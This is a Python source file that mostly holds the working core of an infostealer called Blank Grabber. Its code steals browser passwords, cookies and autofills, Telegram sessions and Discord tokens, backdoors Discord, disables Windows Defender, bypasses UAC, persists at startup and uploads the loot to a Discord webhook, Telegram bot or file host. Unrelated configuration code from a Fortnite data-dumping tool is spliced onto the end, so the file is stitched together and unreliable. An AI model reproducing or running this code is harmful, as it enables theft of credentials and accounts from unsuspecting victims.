pAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                self.ScreenshotTaken = True

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            if autofills:
                                output = '\n'.join(autofills)
                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, 'Webcam')
            os.makedirs(camdir, exist_ok=True)
            camIndex = 0
            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                camIndex += 1
                self.WebcamPicturesCount += 1
            if self.WebcamPicturesCount == 0:
                shutil.rmtree(camdir)

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv('appdata'), 'Telegram Desktop'))
            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, 'tdata')
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False
                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == 'key_datas':
                            has_key_datas = True
                            loginPaths.append(itempath)
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                    for filename in files:
                        for dirname in dirs:
                            if dirname + 's' == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, 'Profile %d' % (index + 1))
                    os.makedirs(_saveToDir, exist_ok=True)
                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                    file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info('Injecting backdoor into discord')
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str]:
        Logger.info('Creating archive')
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'blank123'
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        Logger.info('Sending data to C2')
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError('Failed to create archive')
        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
        computerName = os.getenv('computername') or 'Unable to get computer name'
        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
            if r.get('status') != 'success':
                raise Exception('Failed')
            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
            if len(r['reverse']) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception:
            ipinfo = '(Unable to get IP info)'
        else:
            ipinfo = data
        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['content'] += ' | Archive : %s' % url
                else:
                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
                fields['payload_json'] = json.dumps(payload).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            case 1:
                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
                    method = 'sendMessage'
                else:
                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
                    method = 'sendDocument'
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
if os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                Logger.info('Trying to bypass UAC (Application will restart)')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('Failed to bypass UAC')
                    if not Utility.IsInStartup(sys.executable):
                        logger.info('Showing UAC prompt')
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                Logger.info('Showing UAC prompt to user (Application will restart)')
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)
    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundFileDst)
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1])
            with open(boundFileDst, 'wb') as file:
                file.write(decrypted)
            del content, decrypted
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundFileDst)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Hiding the file')
                Utility.HideSelf()
        elif Settings.Melt:
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                Logger.info('Trying to put the file in startup')
                path = Utility.PutInStartup()
                if path is not None:
                    Logger.info('Excluding the file from Windows defender in startup')
                    Utility.ExcludeFromDefender(path)
        except Exception:
            Logger.error('Failed to put the file in startup')
        while True:
            try:
                Logger.info('Checking internet connection')
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
                    BlankGrabber()
                    Logger.info('Stealer finished its work')
                    break
                else:
                    Logger.info('Internet connection not found, retrying in 10 seconds')
                    time.sleep(10)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                Logger.critical(e, exc_info=True)
                Logger.info('There was an error, retrying after 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        Logger.info('Process ended')

        # Error with a custom message.
def customError(text):
    input(f"ERROR: {text}\n\nPress ENTER to close the program.\n")
    exit()

# Error for invalid config values.
def configError(key, value, validValues): customError(f"You set the wrong {key} value in config.ini ({value}). Valid values: {validValues}. Please change it and run this program again.")

# Loop input until the response is one of the correct values.
def validInput(text, values):
    response = input(f"{text}\n")
    print()
    while True:
        if response in values: break
        response = input("You provided a wrong value. Please input it again.\n")
        print()
    return response

# Get the text from a request and check for errors.
def requestText(request, bJson):
    if bJson: requestText = json.loads(request.text)
    else: requestText = request.text
    if "errorMessage" in requestText: customError(requestText['errorMessage'])
    return requestText

# Send token request.
def reqTokenText(loginLink, altLoginLink, authHeader):
    count = 0
    while True:
        count += 1
        if count > 1: loginLink = altLoginLink
        webbrowser.open_new_tab(loginLink)
        print(f"If the program didn't open it, copy this link to your browser: {(loginLink)}\n")
        reqToken = json.loads(session.post(links.getOAuth.format("token"), headers={"Authorization": f"basic {authHeader}"}, data={"grant_type": "authorization_code", "code": input("Insert the auth code:\n")}).text)
        if not "errorMessage" in reqToken: break
        else: input(f"\n{reqToken['errorMessage']}.\nPress ENTER to open the website again and get the code.\n")
    return reqToken

# Round the file size.
def roundSize(filePathToSave):
    fileSize = round(os.path.getsize(filePathToSave)/1024, 1)
    if str(fileSize).endswith(".0"): fileSize = round(fileSize)
    if fileSize == 0: fileSize = round(os.path.getsize(filePathToSave)/1024, 2)
    return fileSize

# Create and/or read the config.ini file.
config, configPath, authPath = [ConfigParser(), os.path.join(os.path.split(os.path.abspath(__file__))[0], "config.ini"), os.path.join(os.path.split(os.path.abspath(__file__))[0], "auth.json")]
langValues, countryValues, boolValues = [["ar", "de", "en", "es", "es-419", "fr", "it", "ja", "ko", "pl", "pt-BR", "ru", "tr"], ["ar", "au", "by", "ca", "ch", "co", "cz", "dk", "gb", "hu", "il", "in", "ke", "kr", "kz", "mx", "my", "no", "nz", "pe", "pl", "rs", "ru", "sa", "se", "sg", "th", "tr", "ua", "us", "za"], ["true", "false"]]
if not os.path.exists(configPath):
    print("Starting to generate the config.ini file.\n")
    bStartSetup = validInput("Type 1 if you want to start the config setup and press ENTER.\nType 2 if you want to use the default config values and press ENTER.", ["1", "2"])
    if bStartSetup == "1":
        iAuthorization_Type = validInput("Which authentication method do you want the program to use?\nToken auth method generates a refresh token to log in. After 23 days of not using this program this token will expire and you will have to regenerate the auth file.\nDevice auth method generates authorization credentials that don't have an expiration date, but can after some time cause epic to ask you to change your password.\nValid values: token, device.", ["token", "device"])
        iLanguage = validInput(f"What language do you want some of the saved responses to be?\nValid values: {', '.join(langValues)}", langValues)
        iCountry = validInput(f"From what country do you want some of the saved responses to be?\nValid values: {', '.join(countryValues)}", countryValues)
        iList = []
        dumpOptionsJson = {"Dump_Single_Responses": "Single Responses (contentpages, timeline, etc.)", "Dump_Catalog": "Catalog (Item Shop) responses", "Dump_Profiles": "Account Profiles", "Dump_Account_Info": "Account Information and Battle Royale statistics", "Dump_Friendlists": "Epic Friends related responses", "Dump_Account_Cloudstorage": "Account Cloudstorage", "Dump_Global_Cloudstorage": "Global Cloudstorage", "Dump_Discovery": "Discovery Tab responses"}
        for option in dumpOptionsJson: iList.append(validInput(f"Do you want the program to dump the {dumpOptionsJson[option]}?\nValid values: {', '.join(boolValues)}.", boolValues))
        iDump_Single_Responses, iDump_Catalog, iDump_Profiles, iDump_Account_Info, iDump_Friendlists, iDump_Account_Cloudstorage, iDump_Global_Cloudstorage, iDump_Discovery = iList
        iSave_Empty_Cloudstorage = validInput(f"Do you want the program to save Global Cloudstorage files that are empty?\nValid values: {', '.join(boolValues)}.", boolValues)
    else:
        iAuthorization_Type, iLanguage, iCountry, iDump_Single_Responses, iDump_Catalog, iDump_Profiles, iDump_Account_Info, iDump_Friendlists, iDump_Account_Cloudstorage, iDump_Global_Cloudstorage, iSave_Empty_Cloudstorage, iDump_Discovery = ["token", "en", "us", "true", "true", "true", "true", "true", "true", "true", "false", "true"]
        try: iAuthorization_Type = json.loads(open(authPath, "r").read())["authType"]
        except: []
    with open(configPath, "w") as configFile: configFile.write(f"[Fortnite_Response_Dumper_Config]\n\n# Which authentication method do you want the program to use?\n# Token auth method generates a refresh token to log in. The limit per IP is 1. After 23 days of not using this program this token will expire and you will have to regenerate the auth file.\n# Device auth method generates authorization credentials that don't have an expiration date and limit per IP, but can after some time cause epic to ask you to change your password.\n# Valid values: token, device.\nAuthorization_Type = {iAuthorization_Type}\n\n# What language do you want some of the saved responses to be?\n# Valid values: {', '.join(langValues)}.\nLanguage = {iLanguage}\n\n# From what country do you want some of the saved responses to be?\n# Valid values: {', '.join(countryValues)}.\nCountry = {iCountry}\n\n# Do you want the program to dump the Single Responses (contentpages, timeline, etc.)?\n# Valid values: true, false.\nDump_Single_Responses = {iDump_Single_Responses}\n\n# Do you want the program to dump the Catalog (Item Shop) responses?\n# Valid values: true, false.\nDump_Catalog = {iDump_Catalog}\n\n# Do you want the program to dump the account profiles?\n# Valid values: true, false.\nDump_Profiles = {iDump_Profiles}\n\n# Do you want the program to dump the Account Information and Battle Royale statistics? It may contain some personal data.\n# Valid values: true, false.\nDump_Account_Info = {iDump_Account_Info}\n\n# Do you want the program to dump the Epic Friends related responses?\n# Valid values: true, false.\nDump_Friendlists = {iDump_Friendlists}\n\n# Do you want the program to dump the account Cloudstorage?\n# Valid values: true, false.\nDump_Account_Cloudstorage = {iDump_Account_Cloudstorage}\n\n# Do you want the program to dump the global Cloudstorage?\n# Valid values: true, false.\nDump_Global_Cloudstorage = {iDump_Global_Cloudstorage}\n\n# Do you want the program to save Cloudstorage files that are empty?\n# Valid values: true, false.\nSave_Empty_Cloudstorage = {iSave_Empty_Cloudstorage}\n\n# Do you want the program to dump the Discovery Tab responses?\n# Valid values: true, false.\nDump_Discovery = {iDump_Discovery}\n\n# Do not change anything below.\n[Config_Version]\nVersion = FRD_{configVersion}")
    print("The config.ini file was generated successfully.\n")
try:
    config.read(configPath)
    configVer, authType, lang, country, bDumpSingleResponses, bDumpCatalog, bDumpProfiles, bDumpAcocuntInfo, bDumpFriendlists, bDumpAccountCloudstorage, bDumpGlobalCloudstorage, bSaveEmptyCloudstorage, bDumpDiscovery = [config['Config_Version']['Version'], config['Fortnite_Response_Dumper_Config']['Authorization_Type'].lower(), config['Fortnite_Response_Dumper_Config']['Language'].lower(), config['Fortnite_Response_Dumper_Config']['Country'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Single_Responses'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Catalog'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Profiles'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Account_Info'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Friendlists'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Account_Cloudstorage'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Global_Cloudstorage'].lower(), config['Fortnite_Response_Dumper_Config']['Save_Empty_Cloudstorage'].lower(), config['Fortnite_Response_Dumper_Config']['Dump_Discovery'].lower()]
except:
    customError("The program is unable to read the config.ini file. Delete the config.ini file and run this program again to generate a new one.")
checkValuesJson = {"Authorization_Type": {"value": authType, "validValues": ["token", "device"]}, "Language": {"value": lang, "validValues": langValues}, "Country": {"value": country, "validValues": countryValues}, "Dump_Single_Responses": {"value": bDumpSingleResponses, "validValues": boolValues}, "Dump_Catalog": {"value": bDumpCatalog, "validValues": boolValues}, "Dump_Profiles": {"value": bDumpProfiles, "validValues": boolValues}, "Dump_Account_Info": {"value": bDumpAcocuntInfo, "validValues": boolValues}, "Dump_Friendlists": {"value": bDumpFriendlists, "validValues": boolValues}, "Dump_Account_Cloudstorage": {"value": bDumpAccountCloudstorage, "validValues": boolValues}, "Dump_Global_Cloudstorage": {"value": bDumpGlobalCloudstorage, "validValues": boolValues}, "Save_Empty_Cloudstorage": {"value": bSaveEmptyCloudstorage, "validValues": boolValues}, "Dump_Discovery": {"value": bDumpDiscovery, "validValues": boolValues}}
for option in checkValuesJson:
    if not (checkValuesJson[option]['value'] in checkValuesJson[option]['validValues']): customError(f"You set the wrong {option} value in config.ini ({checkValuesJson[option]['value']}). Valid values: {', '.join(checkValuesJson[option]['validValues'])}. Please change it and run this program again.")
if not (configVer == f"FRD_{configVersion}"): customError("The config file is outdated. Delete the config.ini file and run this program again to generate a new one.")

# Create and/or read the auth.json file.
if not os.path.exists(authPath):
    isLoggedIn = validInput("Starting to generate the auth.json file.\n\nAre you logged into your Epic account that you would like the program to use in your browser?\nType 1 if yes and press ENTER.\nType 2 if no and press ENTER.\n", ["1", "2"])
    input("The program is going to open an Epic Games webpage.\nTo continue, press ENTER.\n")
    if isLoggedIn == "1": loginLink = links.loginLink1
    else: loginLink = links.loginLink2
    if authType == "token":
        reqToken = reqTokenText(loginLink.format("34a02cf8f4414e29b15921876da36f9a"), links.loginLink1.format("34a02cf8f4414e29b15921876da36f9a"), "MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=")
        refreshToken, vars.accountId, expirationDate = [reqToken["refresh_token"], reqToken["account_id"], reqToken["refresh_expires_at"]]
        with open(authPath, "w") as authFile: json.dump({"WARNING": "Don't show anyone the contents of this file, because it contains information with which the program logs into the account.", "authType": "token", "refreshToken": refreshToken, "accountId": vars.accountId, "refresh_expires_at": expirationDate}, authFile, indent = 2)
    else:
        reqToken = reqTokenText(loginLink.format("3446cd72694c4a4485d81b77adbb2141"), links.loginLink1.format("3446cd72694c4a4485d81b77adbb2141"), "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=")
        accessToken, vars.accountId = [reqToken["access_token"], reqToken["account_id"]]
        reqDeviceAuth = requestText(session.post(links.getDeviceAuth.format(vars.accountId), headers={"Authorization": f"bearer {accessToken}"}, data={}), True)
        deviceId, secret = [reqDeviceAuth["deviceId"], reqDeviceAuth["secret"]]
